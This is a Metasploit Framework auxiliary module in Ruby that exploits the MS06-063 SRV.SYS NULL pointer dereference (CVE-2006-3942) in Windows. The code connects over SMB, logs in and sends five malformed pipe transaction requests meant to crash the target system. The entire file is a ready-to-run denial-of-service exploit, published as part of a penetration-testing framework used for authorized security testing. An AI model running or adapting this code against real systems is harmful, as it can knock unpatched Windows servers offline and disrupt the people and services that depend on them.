##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SRV.SYS Pipe Transaction No Null',
      'Description'    => %q{
        This module exploits a NULL pointer dereference flaw in the
      SRV.SYS driver of the Windows operating system. This bug was
      independently discovered by CORE Security and ISS.
      },

      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '27644' ],
          ['MSB', 'MS06-063' ],
          ['CVE', '2006-3942'],
          ['BID', '19215'],
        ]
    ))

  end

  def run

    print_status("Connecting to the target system...");

    connect
    smb_login

    begin
      1.upto(5) do |i|
        print_status("Sending bad SMB transaction request #{i}...");
        self.simple.client.trans_nonull(
          "\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}",
          '',
          Rex::Text.rand_text_alphanumeric(rand(16)+1),
          3,
          [1,0,1].pack('vvv'),
          true
        )
      end
    rescue ::Interrupt
      return

    rescue ::Exception => e
      print_error("Error: #{e.class} > #{e}")
    end


    disconnect
  end

end
